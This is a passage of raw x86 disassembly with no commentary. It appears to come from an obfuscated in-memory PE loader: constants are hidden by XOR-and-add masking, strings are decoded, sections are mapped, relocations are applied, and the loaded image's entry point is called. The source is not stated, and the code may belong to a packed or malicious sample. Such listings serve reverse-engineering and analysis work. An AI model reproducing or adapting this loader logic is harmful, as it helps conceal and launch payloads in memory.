  426ef8:	mov    eax,DWORD PTR [eax+ebx*4]
  426efb:	mov    DWORD PTR [ebp-0x14],eax
  426efe:	mov    eax,DWORD PTR [ebp-0x1c]
  426f01:	mov    eax,DWORD PTR [eax+ebx*4]
  426f04:	mov    DWORD PTR [ebp+0xc],eax
  426f07:	mov    eax,DWORD PTR [ebp-0x4]
  426f0a:	mov    ecx,DWORD PTR [ebp-0x14]
  426f0d:	xor    eax,esi
  426f0f:	add    eax,edi
  426f11:	cmp    eax,ecx
  426f13:	je     0x426f3e
  426f15:	mov    eax,DWORD PTR [ebp-0x4]
  426f18:	mov    ecx,DWORD PTR [ebp-0x14]
  426f1b:	xor    eax,esi
  426f1d:	add    eax,edi
  426f1f:	shr    ecx,0x1f
  426f22:	cmp    eax,ecx
  426f24:	je     0x426f3e
  426f26:	mov    ecx,DWORD PTR [ebp-0x14]
  426f29:	mov    eax,DWORD PTR [ebp+0x10]
  426f2c:	mov    eax,DWORD PTR [eax+0x1e0]
  426f32:	movzx  ecx,cx
  426f35:	push   ecx
  426f36:	push   DWORD PTR [ebp-0xc]
  426f39:	call   DWORD PTR [eax+0x8]
  426f3c:	jmp    0x426f57
  426f3e:	mov    eax,DWORD PTR [ebp+0xc]
  426f41:	add    eax,DWORD PTR [ebp+0x8]
  426f44:	mov    ecx,DWORD PTR [ebp+0x10]
  426f47:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426f4d:	add    eax,0x2
  426f50:	push   eax
  426f51:	push   DWORD PTR [ebp-0xc]
  426f54:	call   DWORD PTR [ecx+0x8]
  426f57:	mov    DWORD PTR [ebp+0xc],eax
  426f5a:	mov    eax,DWORD PTR [ebp-0x4]
  426f5d:	mov    ecx,DWORD PTR [ebp+0xc]
  426f60:	xor    eax,esi
  426f62:	add    eax,edi
  426f64:	cmp    eax,ecx
  426f66:	mov    eax,DWORD PTR [ebp-0x8]
  426f69:	jne    0x426f7c
  426f6b:	mov    ecx,DWORD PTR [ebp-0x18]
  426f6e:	xor    eax,esi
  426f70:	lea    eax,[ecx+eax*1+0x3272f1]
  426f77:	mov    DWORD PTR [ebp-0x18],eax
  426f7a:	jmp    0x426f8c
  426f7c:	mov    ecx,DWORD PTR [ebp+0xc]
  426f7f:	xor    eax,esi
  426f81:	add    eax,edi
  426f83:	imul   eax,ecx
  426f86:	mov    ecx,DWORD PTR [ebp-0x1c]
  426f89:	mov    DWORD PTR [ecx+ebx*4],eax
  426f8c:	mov    eax,DWORD PTR [ebp-0x8]
  426f8f:	xor    eax,esi
  426f91:	lea    ebx,[ebx+eax*1+0x3272f1]
  426f98:	mov    eax,DWORD PTR [ebp-0x4]
  426f9b:	mov    ecx,DWORD PTR [ebp-0x1c]
  426f9e:	xor    eax,esi
  426fa0:	add    eax,edi
  426fa2:	cmp    DWORD PTR [ecx+ebx*4],eax
  426fa5:	jne    0x426ed6
  426fab:	mov    edx,DWORD PTR [ebp-0x10]
  426fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  426fb1:	mov    eax,DWORD PTR [ebp-0x18]
  426fb4:	sub    edx,0x3272f0
  426fba:	xor    edx,esi
  426fbc:	jmp    0x426d86
  426fc1:	mov    ecx,DWORD PTR [ebp-0x4]
  426fc4:	xor    ecx,esi
  426fc6:	add    ecx,edi
  426fc8:	cmp    eax,ecx
  426fca:	mov    eax,DWORD PTR [ebp-0x4]
  426fcd:	jne    0x426fd7
  426fcf:	mov    eax,DWORD PTR [ebp-0x8]
  426fd2:	jmp    0x426fd7
  426fd4:	mov    eax,DWORD PTR [ebp-0x4]
  426fd7:	xor    eax,esi
  426fd9:	add    eax,edi
  426fdb:	pop    edi
  426fdc:	pop    esi
  426fdd:	pop    ebx
  426fde:	leave  
  426fdf:	ret    0xc
  426fe2:	push   ebp
  426fe3:	mov    ebp,esp
  426fe5:	sub    esp,0x28
  426fe8:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426fef:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  426ff6:	mov    eax,DWORD PTR [ebp+0xc]
  426ff9:	mov    DWORD PTR [ebp+0xc],eax
  426ffc:	push   esi
  426ffd:	mov    eax,eax
  426fff:	mov    eax,DWORD PTR [ebp-0x4]
  427002:	mov    esi,DWORD PTR [ebp+0x8]
  427005:	mov    ecx,0x75108aa
  42700a:	xor    eax,ecx
  42700c:	mov    edx,0x3272f1
  427011:	add    eax,edx
  427013:	cmp    esi,eax
  427015:	je     0x42713c
  42701b:	mov    eax,DWORD PTR [ebp+0x8]
  42701e:	mov    esi,DWORD PTR [ebp+0x8]
  427021:	add    esi,DWORD PTR [eax+0x3c]
  427024:	push   edi
  427025:	mov    DWORD PTR [ebp+0xc],esi
  427028:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42702f:	mov    eax,DWORD PTR [ebp-0x1c]
  427032:	mov    esi,DWORD PTR [ebp-0x4]
  427035:	mov    edi,DWORD PTR [ebp+0xc]
  427038:	xor    esi,ecx
  42703a:	xor    eax,ecx
  42703c:	add    esi,edx
  42703e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427045:	je     0x427136
  42704b:	mov    esi,DWORD PTR [ebp+0xc]
  42704e:	mov    eax,DWORD PTR [ebp+0x8]
  427051:	add    eax,DWORD PTR [esi+0xa0]
  427057:	mov    esi,DWORD PTR [ebp+0x8]
  42705a:	mov    edi,DWORD PTR [ebp+0xc]
  42705d:	sub    esi,DWORD PTR [edi+0x34]
  427060:	mov    edi,DWORD PTR [ebp-0x4]
  427063:	xor    edi,ecx
  427065:	add    edi,edx
  427067:	mov    DWORD PTR [ebp-0x24],esi
  42706a:	cmp    esi,edi
  42706c:	je     0x427136
  427072:	mov    esi,DWORD PTR [ebp-0x4]
  427075:	xor    esi,ecx
  427077:	add    esi,edx
  427079:	mov    DWORD PTR [ebp-0x8],esi
  42707c:	push   ebx
  42707d:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  427084:	jmp    0x427120
  427089:	mov    esi,DWORD PTR [ebp-0x4]
  42708c:	xor    esi,ecx
  42708e:	lea    edi,[ebx-0x8]
  427091:	add    esi,edx
  427093:	shr    edi,1
  427095:	cmp    esi,edi
  427097:	jae    0x427106
  427099:	sub    edi,esi
  42709b:	lea    ebx,[eax+esi*2+0x8]
  42709f:	mov    DWORD PTR [ebp-0x18],edi
  4270a2:	movzx  esi,WORD PTR [ebx]
  4270a5:	and    esi,0xfff
  4270ab:	mov    DWORD PTR [ebp-0x14],esi
  4270ae:	mov    edi,DWORD PTR [ebp-0x14]
  4270b1:	mov    esi,DWORD PTR [eax]
  4270b3:	sub    esi,edx
  4270b5:	add    edi,esi
  4270b7:	movzx  esi,WORD PTR [ebx]
  4270ba:	shr    esi,0xc
  4270bd:	xor    edi,ecx
  4270bf:	mov    DWORD PTR [ebp-0x20],edi
  4270c2:	mov    DWORD PTR [ebp-0x14],esi
  4270c5:	mov    esi,DWORD PTR [ebp-0x20]
  4270c8:	mov    edi,DWORD PTR [ebp+0x8]
  4270cb:	xor    esi,ecx
  4270cd:	lea    esi,[esi+edi*1+0x3272f1]
  4270d4:	mov    DWORD PTR [ebp-0x20],esi
  4270d7:	mov    esi,DWORD PTR [ebp-0x10]
  4270da:	mov    edi,DWORD PTR [ebp-0x14]
  4270dd:	xor    esi,ecx
  4270df:	add    esi,edx
  4270e1:	cmp    edi,esi
  4270e3:	jne    0x4270fb
  4270e5:	mov    esi,DWORD PTR [ebp-0x10]
  4270e8:	mov    edi,DWORD PTR [ebp-0x14]
  4270eb:	xor    esi,ecx
  4270ed:	add    esi,edx
  4270ef:	cmp    edi,esi
  4270f1:	jne    0x4270fb
  4270f3:	mov    esi,DWORD PTR [ebp-0x20]
  4270f6:	mov    edi,DWORD PTR [ebp-0x24]
  4270f9:	add    DWORD PTR [esi],edi
  4270fb:	add    ebx,0x2
  4270fe:	dec    DWORD PTR [ebp-0x18]
  427101:	jne    0x4270a2
  427103:	mov    ebx,DWORD PTR [ebp-0xc]
  427106:	add    DWORD PTR [ebp-0x8],ebx
  427109:	mov    esi,DWORD PTR [ebp-0x1c]
  42710c:	mov    edi,DWORD PTR [ebp-0x8]
  42710f:	mov    ebx,DWORD PTR [ebp+0xc]
  427112:	xor    esi,ecx
  427114:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42711b:	jae    0x427135
  42711d:	add    eax,DWORD PTR [ebp-0xc]
  427120:	mov    esi,DWORD PTR [ebp-0x4]
  427123:	mov    ebx,DWORD PTR [eax+0x4]
  427126:	xor    esi,ecx
  427128:	add    esi,edx
  42712a:	mov    DWORD PTR [ebp-0xc],ebx
  42712d:	cmp    ebx,esi
  42712f:	jne    0x427089
  427135:	pop    ebx
  427136:	mov    eax,DWORD PTR [ebp-0x28]
  427139:	pop    edi
  42713a:	jmp    0x42713f
  42713c:	mov    eax,DWORD PTR [ebp-0x4]
  42713f:	xor    eax,ecx
  427141:	add    eax,edx
  427143:	pop    esi
  427144:	leave  
  427145:	ret    0x8
  427148:	push   ebp
  427149:	mov    ebp,esp
  42714b:	sub    esp,0xd8
  427151:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427158:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  42715f:	mov    eax,DWORD PTR [ebp-0x4]
  427162:	push   ebx
  427163:	push   esi
  427164:	mov    esi,0x75108aa
  427169:	xor    eax,esi
  42716b:	push   edi
  42716c:	mov    edi,0x3272f1
  427171:	add    eax,edi
  427173:	mov    DWORD PTR [ebp-0x18],eax
  427176:	mov    eax,DWORD PTR [ebp-0x4]
  427179:	xor    eax,esi
  42717b:	add    eax,edi
  42717d:	mov    DWORD PTR [ebp-0x8],eax
  427180:	mov    ebx,DWORD PTR [ebp+0x20]
  427183:	mov    eax,DWORD PTR [ebp-0x1c]
  427186:	mov    ecx,DWORD PTR [ebp-0x1c]
  427189:	xor    eax,ecx
  42718b:	mov    DWORD PTR [ebp-0x1c],eax
  42718e:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427195:	mov    eax,DWORD PTR [ebp-0xc]
  427198:	mov    ecx,DWORD PTR [ebp-0xc]
  42719b:	xor    eax,ecx
  42719d:	mov    DWORD PTR [ebp-0xc],eax
  4271a0:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4271a7:	mov    eax,DWORD PTR [ebp-0x10]
  4271aa:	mov    ecx,DWORD PTR [ebp-0x10]
  4271ad:	xor    eax,ecx
  4271af:	mov    DWORD PTR [ebp-0x10],eax
  4271b2:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4271b9:	mov    eax,DWORD PTR [ebp-0x28]
  4271bc:	mov    ecx,DWORD PTR [ebp-0x28]
  4271bf:	xor    eax,ecx
  4271c1:	mov    DWORD PTR [ebp-0x28],eax
  4271c4:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4271cb:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4271d2:	mov    eax,DWORD PTR [ebp+0x8]
  4271d5:	test   eax,eax
  4271d7:	je     0x427660
  4271dd:	mov    eax,DWORD PTR [ebp+0xc]
  4271e0:	test   eax,eax
  4271e2:	je     0x427660
  4271e8:	mov    eax,DWORD PTR [ebp+0x18]
  4271eb:	test   eax,eax
  4271ed:	je     0x427660
  4271f3:	mov    eax,DWORD PTR [ebp+0x20]
  4271f6:	mov    ecx,DWORD PTR [ebp+0x8]
  4271f9:	xor    eax,0x8aa
  4271fe:	add    eax,0x72f1
  427203:	cmp    WORD PTR [ecx],ax
  427206:	jne    0x427660
  42720c:	mov    eax,DWORD PTR [ebp-0x4]
  42720f:	xor    eax,esi
  427211:	add    eax,edi
  427213:	mov    DWORD PTR [ebp-0x30],eax
  427216:	mov    eax,DWORD PTR [ebp-0x4]
  427219:	mov    ecx,DWORD PTR [ebp+0x8]
  42721c:	mov    eax,DWORD PTR [ebp+0x8]
  42721f:	add    eax,DWORD PTR [ecx+0x3c]
  427222:	mov    DWORD PTR [ebp+0xc],eax
  427225:	mov    eax,DWORD PTR [eax+0x50]
  427228:	test   eax,eax
  42722a:	je     0x427660
  427230:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427237:	mov    eax,DWORD PTR [ebp-0x2c]
  42723a:	xor    eax,esi
  42723c:	add    eax,edi
  42723e:	mov    DWORD PTR [ebp-0x2c],eax
  427241:	mov    eax,DWORD PTR [ebp-0x4]
  427244:	mov    eax,DWORD PTR [ebx+0x190]
  42724a:	mov    ecx,DWORD PTR [eax]
  42724c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42724f:	add    ecx,DWORD PTR [eax]
  427251:	mov    eax,DWORD PTR [ebp-0x4]
  427254:	mov    eax,DWORD PTR [ebx+0x18c]
  42725a:	mov    edx,DWORD PTR [eax]
  42725c:	mov    DWORD PTR [ebp-0x20],ecx
  42725f:	mov    DWORD PTR [ebp+0x20],edx
  427262:	cmp    edx,edx
  427264:	jne    0x427298
  427266:	mov    eax,DWORD PTR [ebx+0x1e0]
  42726c:	lea    edx,[ebp-0x18]
  42726f:	push   edx
  427270:	mov    edx,DWORD PTR [ebp-0xc]
  427273:	xor    edx,esi
  427275:	add    edx,edi
  427277:	push   edx
  427278:	push   DWORD PTR [ecx+0x50]
  42727b:	push   DWORD PTR [ebp+0x20]
  42727e:	call   DWORD PTR [eax+0x1c]
  427281:	mov    eax,DWORD PTR [ebp-0x20]
  427284:	mov    ecx,DWORD PTR [eax+0x54]
  427287:	mov    eax,DWORD PTR [eax+0x50]
  42728a:	sub    eax,ecx
  42728c:	add    ecx,DWORD PTR [ebp+0x20]
  42728f:	push   ecx
  427290:	call   0x427bfb
  427295:	mov    edx,DWORD PTR [ebp+0x20]
  427298:	mov    eax,DWORD PTR [ebx+0x194]
  42729e:	mov    DWORD PTR [eax],edx
  4272a0:	mov    eax,DWORD PTR [ebp+0xc]
  4272a3:	push   DWORD PTR [eax+0x54]
  4272a6:	push   DWORD PTR [ebp+0x8]
  4272a9:	push   edx
  4272aa:	call   0x427af1
  4272af:	mov    ecx,DWORD PTR [ebp+0x20]
  4272b2:	mov    eax,DWORD PTR [ecx+0x3c]
  4272b5:	add    eax,ecx
  4272b7:	movzx  ecx,WORD PTR [eax+0x14]
  4272bb:	lea    ecx,[ecx+eax*1+0x18]
  4272bf:	mov    DWORD PTR [ebp+0x18],ecx
  4272c2:	mov    ecx,DWORD PTR [ebp-0x4]
  4272c5:	movzx  edx,WORD PTR [eax+0x6]
  4272c9:	xor    ecx,esi
  4272cb:	add    ecx,edi
  4272cd:	mov    DWORD PTR [ebp+0xc],eax
  4272d0:	cmp    edx,ecx
  4272d2:	je     0x42737f
  4272d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4272db:	xor    ecx,esi
  4272dd:	add    ecx,edi
  4272df:	mov    DWORD PTR [ebp-0x8],ecx
  4272e2:	mov    ecx,DWORD PTR [ebp-0x24]
  4272e5:	movzx  edx,WORD PTR [eax+0x6]
  4272e9:	xor    ecx,esi
  4272eb:	sub    edx,ecx
  4272ed:	sub    edx,edi
  4272ef:	cmp    DWORD PTR [ebp-0x8],edx
  4272f2:	ja     0x42737f
  4272f8:	mov    edx,DWORD PTR [ebp+0x18]
  4272fb:	add    edx,0x8
  4272fe:	mov    DWORD PTR [ebp+0x18],edx
  427301:	jmp    0x427306
  427303:	mov    edx,DWORD PTR [ebp+0x18]
  427306:	mov    eax,DWORD PTR [eax+0x38]
  427309:	lea    ecx,[eax-0x1]
  42730c:	mov    DWORD PTR [ebp-0x38],eax
  42730f:	mov    eax,DWORD PTR [edx]
  427311:	test   eax,ecx
  427313:	je     0x42731c
  427315:	not    ecx
  427317:	and    eax,ecx
  427319:	add    eax,DWORD PTR [ebp-0x38]
  42731c:	mov    ecx,DWORD PTR [edx+0x4]
  42731f:	add    ecx,DWORD PTR [ebp+0x20]
  427322:	push   ecx
  427323:	call   0x427bfb
  427328:	mov    edx,DWORD PTR [ebp-0x4]
  42732b:	mov    eax,DWORD PTR [ebp+0x18]
  42732e:	mov    ecx,DWORD PTR [eax+0x8]
  427331:	xor    edx,esi
  427333:	add    edx,edi
  427335:	cmp    ecx,edx
  427337:	je     0x427350
  427339:	push   ecx
  42733a:	mov    ecx,DWORD PTR [ebp+0x8]
  42733d:	add    ecx,DWORD PTR [eax+0xc]
  427340:	mov    eax,DWORD PTR [eax+0x4]
  427343:	add    eax,DWORD PTR [ebp+0x20]
  427346:	push   ecx
  427347:	push   eax
  427348:	call   0x427af1
  42734d:	mov    eax,DWORD PTR [ebp+0x18]
  427350:	mov    ecx,DWORD PTR [ebp-0x24]
  427353:	mov    edx,DWORD PTR [ebp-0x8]
  427356:	add    eax,0x28
  427359:	xor    ecx,esi
  42735b:	lea    ecx,[edx+ecx*1+0x3272f1]
  427362:	mov    edx,DWORD PTR [ebp+0xc]
  427365:	mov    DWORD PTR [ebp+0x18],eax
  427368:	mov    eax,DWORD PTR [ebp-0x24]
  42736b:	movzx  edx,WORD PTR [edx+0x6]
  42736f:	xor    eax,esi
  427371:	sub    edx,eax
  427373:	mov    eax,DWORD PTR [ebp+0xc]
  427376:	sub    edx,edi
  427378:	mov    DWORD PTR [ebp-0x8],ecx
  42737b:	cmp    ecx,edx
  42737d:	jbe    0x427303
  42737f:	mov    edx,DWORD PTR [ebx+0x18c]
  427385:	mov    ecx,DWORD PTR [ebp+0x20]
  427388:	cmp    ecx,DWORD PTR [edx]
  42738a:	jne    0x4273b3
  42738c:	mov    eax,DWORD PTR [ebx+0x1e0]
  427392:	lea    edx,[ebp-0x18]
  427395:	push   edx
  427396:	mov    edx,DWORD PTR [ebp-0x10]
  427399:	xor    edx,esi
  42739b:	add    edx,edi
  42739d:	push   edx
  42739e:	mov    edx,DWORD PTR [ebp-0x20]
  4273a1:	push   DWORD PTR [edx+0x54]
  4273a4:	push   ecx
  4273a5:	call   DWORD PTR [eax+0x1c]
  4273a8:	test   eax,eax
  4273aa:	je     0x427651
  4273b0:	mov    eax,DWORD PTR [ebp+0xc]
  4273b3:	mov    ecx,DWORD PTR [ebx+0x1c8]
  4273b9:	mov    ecx,DWORD PTR [ecx]
  4273bb:	xor    ecx,esi
  4273bd:	add    ecx,edi
  4273bf:	je     0x42757c
  4273c5:	mov    eax,DWORD PTR [ebp-0x4]
  4273c8:	xor    eax,esi
  4273ca:	add    eax,edi
  4273cc:	and    DWORD PTR [ebp+0x8],0x0
  4273d0:	mov    DWORD PTR [ebp-0x14],eax
  4273d3:	mov    eax,0xf89c85d9
  4273d8:	lea    ecx,[eax-0x8]
  4273db:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4273e2:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  4273e9:	mov    DWORD PTR [ebp-0x50],eax
  4273ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4273ef:	mov    DWORD PTR [ebp-0x48],ecx
  4273f2:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4273f9:	mov    edx,DWORD PTR [ebp+0x8]
  4273fc:	mov    ecx,0x8aa
  427401:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427406:	mov    edx,0x72f1
  42740b:	add    cx,dx
  42740e:	mov    edx,DWORD PTR [ebp+0x8]
  427411:	inc    DWORD PTR [ebp+0x8]
  427414:	cmp    DWORD PTR [ebp+0x8],0x6
  427418:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427420:	jb     0x4273f9
  427422:	mov    ecx,0xf89c852b
  427427:	mov    DWORD PTR [ebp-0xb0],eax
  42742d:	mov    DWORD PTR [ebp-0x9c],eax
  427433:	mov    DWORD PTR [ebp-0x74],eax
  427436:	mov    DWORD PTR [ebp-0x70],eax
  427439:	lea    eax,[ecx-0x3]
  42743c:	mov    edx,0xf89c85ff
  427441:	mov    DWORD PTR [ebp-0x64],eax
  427444:	mov    DWORD PTR [ebp-0x60],eax
  427447:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  427451:	mov    DWORD PTR [ebp-0xac],ecx
  427457:	mov    DWORD PTR [ebp-0xa8],edx
  42745d:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  427467:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427471:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  42747b:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427485:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  42748f:	mov    DWORD PTR [ebp-0x8c],ecx
  427495:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  42749f:	mov    DWORD PTR [ebp-0x84],edx
  4274a5:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  4274ac:	mov    DWORD PTR [ebp-0x7c],ecx
  4274af:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  4274b6:	mov    DWORD PTR [ebp-0x6c],ecx
  4274b9:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  4274c0:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  4274c7:	xor    eax,eax
  4274c9:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4274d0:	xor    cl,0xaa
  4274d3:	sub    cl,0xf
  4274d6:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4274dd:	inc    eax
  4274de:	cmp    eax,0x17
  4274e1:	jb     0x4274c9
  4274e3:	mov    eax,DWORD PTR [ebx+0x1e0]
  4274e9:	lea    ecx,[ebp-0xc0]
  4274ef:	push   ecx
  4274f0:	call   DWORD PTR [eax+0x4]
  4274f3:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4274f9:	lea    edx,[ebp-0xd8]
  4274ff:	push   edx
  427500:	push   eax
  427501:	call   DWORD PTR [ecx+0x8]
  427504:	mov    DWORD PTR [ebp-0x40],eax
  427507:	lea    eax,[ebp-0x14]
  42750a:	push   eax
  42750b:	mov    eax,DWORD PTR [ebx+0x18c]
  427511:	push   DWORD PTR [eax]
  427513:	mov    eax,DWORD PTR [ebp-0x40]
  427516:	call   eax
  427518:	mov    eax,DWORD PTR [ebp-0x4]
  42751b:	xor    eax,esi
  42751d:	add    eax,edi
  42751f:	mov    DWORD PTR [ebp-0x34],eax
  427522:	mov    ecx,DWORD PTR [ebp-0x4]
  427525:	mov    eax,DWORD PTR [ebp-0x14]
  427528:	xor    ecx,esi
  42752a:	add    ecx,edi
  42752c:	cmp    eax,ecx
  42752e:	je     0x427579
  427530:	mov    DWORD PTR [ebp-0x3c],eax
  427533:	jmp    0x427544
  427535:	mov    eax,DWORD PTR [eax]
  427537:	mov    ecx,DWORD PTR [ebp-0x3c]
  42753a:	mov    DWORD PTR [ebp-0x14],eax
  42753d:	mov    eax,DWORD PTR [ebp-0x14]
  427540:	cmp    eax,ecx
  427542:	je     0x427551
  427544:	mov    edx,DWORD PTR [eax+0x18]
  427547:	mov    ecx,DWORD PTR [ebx+0x18c]
  42754d:	cmp    edx,DWORD PTR [ecx]
  42754f:	jne    0x427535
  427551:	mov    ecx,DWORD PTR [ebx+0x18c]
  427557:	mov    edx,DWORD PTR [eax+0x18]
  42755a:	cmp    edx,DWORD PTR [ecx]
  42755c:	jne    0x427579
  42755e:	mov    ecx,DWORD PTR [ebx+0x190]
  427564:	mov    edx,DWORD PTR [ebp-0x20]
  427567:	mov    edx,DWORD PTR [edx+0x28]
  42756a:	add    edx,DWORD PTR [ecx]
  42756c:	mov    DWORD PTR [eax+0x1c],edx
  42756f:	mov    eax,DWORD PTR [ebp-0x24]
  427572:	xor    eax,esi
  427574:	add    eax,edi
  427576:	mov    DWORD PTR [ebp-0x34],eax
  427579:	mov    eax,DWORD PTR [ebp+0xc]
  42757c:	push   ebx
  42757d:	push   eax
  42757e:	push   DWORD PTR [ebp+0x20]
  427581:	call   0x426cff
  427586:	test   eax,eax
  427588:	je     0x427651
  42758e:	push   DWORD PTR [ebp+0xc]
  427591:	mov    ecx,ebx
  427593:	push   DWORD PTR [ebp+0x20]
  427596:	call   0x426c58
  42759b:	test   eax,eax
  42759d:	je     0x427651
  4275a3:	mov    eax,DWORD PTR [ebp+0xc]
  4275a6:	mov    edx,DWORD PTR [ebp+0x20]
  4275a9:	mov    ecx,ebx
  4275ab:	call   0x426b31
  4275b0:	test   eax,eax
  4275b2:	je     0x427651
  4275b8:	push   ebx
  4275b9:	push   DWORD PTR [ebp+0x20]
  4275bc:	call   0x426fe2
  4275c1:	test   eax,eax
  4275c3:	je     0x427651
  4275c9:	mov    eax,DWORD PTR [ebx+0x18c]
  4275cf:	mov    edx,DWORD PTR [ebp+0x20]
  4275d2:	cmp    edx,DWORD PTR [eax]
  4275d4:	jne    0x4275f0
  4275d6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4275dc:	lea    ecx,[ebp-0x18]
  4275df:	push   ecx
  4275e0:	push   DWORD PTR [ebp-0x18]
  4275e3:	mov    ecx,DWORD PTR [ebp-0x20]
  4275e6:	push   DWORD PTR [ecx+0x54]
  4275e9:	push   edx
  4275ea:	call   DWORD PTR [eax+0x1c]
  4275ed:	mov    edx,DWORD PTR [ebp+0x20]
  4275f0:	mov    eax,DWORD PTR [ebx+0x1c8]
  4275f6:	mov    eax,DWORD PTR [eax]
  4275f8:	xor    eax,esi
  4275fa:	add    eax,edi
  4275fc:	je     0x427635
  4275fe:	mov    ecx,DWORD PTR [ebp+0xc]
  427601:	mov    eax,DWORD PTR [ecx+0x28]
  427604:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42760b:	mov    esi,DWORD PTR [ebp+0x8]
  42760e:	push   DWORD PTR [ebp+0x14]
  427611:	xor    esi,0x8aa
  427617:	push   DWORD PTR [ebp+0x10]
  42761a:	add    esi,0x72f1
  427620:	or     WORD PTR [ecx+0x16],si
  427624:	add    eax,edx
  427626:	push   edx
  427627:	call   eax
  427629:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427633:	jmp    0x42763f
  427635:	mov    eax,DWORD PTR [ebp+0xc]
  427638:	mov    eax,DWORD PTR [eax+0x28]
  42763b:	add    eax,edx
  42763d:	call   eax
  42763f:	mov    DWORD PTR [ebp-0x8],eax
  427642:	mov    eax,DWORD PTR [ebp-0x8]
  427645:	mov    ecx,DWORD PTR [ebp+0x1c]
  427648:	mov    DWORD PTR [ecx],eax
  42764a:	mov    DWORD PTR [ebp-0x30],0x1
  427651:	cmp    DWORD PTR [ebp-0x30],0x0
  427655:	jne    0x42765b
  427657:	and    DWORD PTR [ebp+0x20],0x0
  42765b:	mov    eax,DWORD PTR [ebp+0x20]
  42765e:	jmp    0x427662
  427660:	xor    eax,eax
  427662:	pop    edi
  427663:	pop    esi
  427664:	pop    ebx
  427665:	leave  
  427666:	ret    0x1c
  427669:	push   ebp
  42766a:	mov    ebp,esp
  42766c:	movzx  edx,WORD PTR [ecx+0x6]
  427670:	movzx  eax,WORD PTR [ecx+0x14]
  427674:	push   ebx
  427675:	push   edi
  427676:	xor    edi,edi
  427678:	lea    eax,[eax+ecx*1+0x18]
  42767c:	test   edx,edx
  42767e:	je     0x42769f
  427680:	mov    ecx,DWORD PTR [eax+0xc]
  427683:	lea    ebx,[ecx+esi*1]
  427686:	cmp    DWORD PTR [ebp+0x8],ebx
  427689:	jb     0x427697
  42768b:	mov    ebx,DWORD PTR [eax+0x8]
  42768e:	add    ebx,ecx
  427690:	add    ebx,esi
  427692:	cmp    DWORD PTR [ebp+0x8],ebx
  427695:	jb     0x4276a1
  427697:	add    eax,0x28
  42769a:	inc    edi
  42769b:	cmp    edi,edx
  42769d:	jb     0x427680
  42769f:	xor    eax,eax
  4276a1:	pop    edi
  4276a2:	pop    ebx
  4276a3:	pop    ebp
  4276a4:	ret    0x4
  4276a7:	push   ebp
  4276a8:	mov    ebp,esp
  4276aa:	sub    esp,0x34
  4276ad:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4276b4:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  4276bb:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  4276c2:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  4276c9:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  4276d0:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  4276d7:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  4276de:	mov    DWORD PTR [ebp-0x10],eax
  4276e1:	mov    eax,DWORD PTR [ebp+0x8]
  4276e4:	mov    DWORD PTR [ebp-0x14],eax
  4276e7:	mov    eax,DWORD PTR [ebp-0xc]
  4276ea:	push   ebx
  4276eb:	mov    ecx,0x75108aa
  4276f0:	xor    eax,ecx
  4276f2:	push   esi
  4276f3:	mov    esi,DWORD PTR [ebp-0x10]
  4276f6:	mov    edx,0x3272f1
  4276fb:	add    eax,edx
  4276fd:	push   edi
  4276fe:	cmp    esi,eax
  427700:	je     0x4278df
  427706:	mov    eax,DWORD PTR [ebp-0xc]
  427709:	mov    esi,DWORD PTR [ebp-0x14]
  42770c:	xor    eax,ecx
  42770e:	add    eax,edx
  427710:	cmp    esi,eax
  427712:	je     0x4278df
  427718:	mov    eax,DWORD PTR [ebp-0xc]
  42771b:	xor    eax,ecx
  42771d:	add    eax,edx
  42771f:	mov    DWORD PTR [ebp-0x24],eax
  427722:	mov    eax,DWORD PTR [ebp-0xc]
  427725:	xor    eax,ecx
  427727:	add    eax,edx
  427729:	mov    DWORD PTR [ebp-0x28],eax
  42772c:	mov    edi,DWORD PTR [ebp-0x20]
  42772f:	mov    ebx,DWORD PTR [ebp-0x8]
  427732:	mov    esi,0x8aa
  427737:	xor    edi,esi
  427739:	mov    eax,0x72f1
  42773e:	xor    ebx,esi
  427740:	add    edi,eax
  427742:	add    ebx,eax
  427744:	sub    ebx,edi
  427746:	mov    WORD PTR [ebp-0x8],bx
  42774a:	jmp    0x42780f
